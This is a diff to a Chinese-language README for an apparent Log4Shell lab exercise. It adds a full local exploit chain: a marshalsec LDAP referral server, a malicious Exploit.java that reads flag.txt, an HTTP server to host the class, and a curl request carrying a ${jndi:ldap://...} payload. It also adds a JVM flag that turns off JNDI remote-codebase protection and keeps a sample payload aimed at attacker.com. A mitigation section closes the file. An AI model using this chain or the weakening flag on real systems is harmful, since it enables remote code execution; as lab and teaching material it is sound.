@@ -37,8 +37,9 @@ https://hackmd.io/@Eevee940323/H1ooVxsbMg
    ```
 
 3. **運行應用**
+   因應較高版本 Java (如 Java 21) 預設封鎖 JNDI 遠端載入類別，需手動注入 JVM 參數以關閉防護：
    ```bash
-   mvn spring-boot:run
+   mvn spring-boot:run -Dspring-boot.run.jvmArguments="-Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
    ```
 
 4. **驗證運行**
@@ -109,17 +110,51 @@ Apache Log4j 2.14.1 是已知存在 Log4Shell 漏洞的版本。官方已在 2.1
 ${jndi:ldap://attacker.com/Evil}
 ```
 
-### 實踐步驟
+### 實踐步驟 (以本機測試為例)
 
-1. **設置本地 LDAP 伺服器**（或使用現成工具如 ysoserial）
-
-2. **構造惡意請求**
+1. **建置與啟動 LDAP 惡意轉介伺服器**
+   使用 `marshalsec` 在本地 `1389` 連接埠建立 LDAP 監聽服務，將請求導向 HTTP 伺服器：
    ```bash
-   curl -H "User-Agent: \${jndi:ldap://[your-ldap-server]/[malicious-class]}" \
-        http://localhost:9090/
+   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 1389
    ```
 
-3. **執行代碼並讀取 flag.txt**
+2. **撰寫與編譯惡意 Java 類別 (Exploit.java)**
+   ```java
+   import java.io.BufferedReader;
+   import java.io.FileReader;
+
+   public class Exploit {
+       static {
+           try {
+               BufferedReader br = new BufferedReader(new FileReader("flag.txt"));
+               String line;
+               System.out.println("====== [HACKED] FLAG START ======");
+               while ((line = br.readLine()) != null) {
+                   System.out.println(line);
+               }
+               System.out.println("====== [HACKED] FLAG END ======");
+               br.close();
+           } catch (Exception e) {
+               e.printStackTrace();
+           }
+       }
+   }
+   ```
+   *注意：因應目標伺服器若為高版本 Java (如 Java 21)，編譯時必須指定版本防範 `UnsupportedClassVersionError` 相容性錯誤：*
+   ```bash
+   javac --release 21 Exploit.java
+   ```
+
+3. **架設輕量 HTTP 伺服器**
+   在 `Exploit.class` 所在目錄啟動 HTTP 服務：
+   ```bash
+   python3 -m http.server 8000
+   ```
+
+4. **發射 Payload 觸發 RCE**
+   ```bash
+   curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}' http://localhost:9090/
+   ```
 
 > ⚠️ **注意**：此示例僅供教育目的。請在隔離的測試環境中進行。
 
@@ -127,22 +162,26 @@ ${jndi:ldap://attacker.com/Evil}
 
 ## 🛡️ 防護與修復方案
 
-### 短期修復
+### 短期與長期修復
 
-1. **升級 Log4j 版本**
+1. **升級核心套件 (根本解決)**
+   將專案中的 Log4j 核心元件（`log4j-core` 與 `log4j-api`）升級至安全版本（`2.15.0` 以上，建議 `2.17.1` 或最新版）：
    ```xml
-   <log4j2.version>2.17.0</log4j2.version>
+   <log4j2.version>2.17.1</log4j2.version>
    ```
 
-2. **禁用 JNDI 功能**
-   ```properties
-   log4j2.formatMsgNoLookups=true
-   ```
+2. **系統參數阻斷 (過渡期)**
+   在無法更換套件時，應確保系統 JVM 啟動引數維持預設的安全限制：
+   `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false`
 
-### 長期最佳實踐
+3. **關閉 Lookup 機制**
+   於設定檔或啟動環境變數中宣告以停用關鍵字解析：
+   `log4j2.formatMsgNoLookups=true` 或是環境變數 `FORMAT_MSG_NO_LOOKUPS=true`
 
-1. ✅ 定期更新依賴庫
-2. ✅ 避免將使用者輸入直接記錄到日誌
+### 開發最佳實踐
+
+1. ✅ 定期更新依賴庫與檢視已知漏洞
+2. ✅ 避免將未經清洗的使用者輸入直接記錄到日誌
 3. ✅ 使用參數化日誌而非字符串連接
 4. ✅ 實施輸入驗證與過濾
 
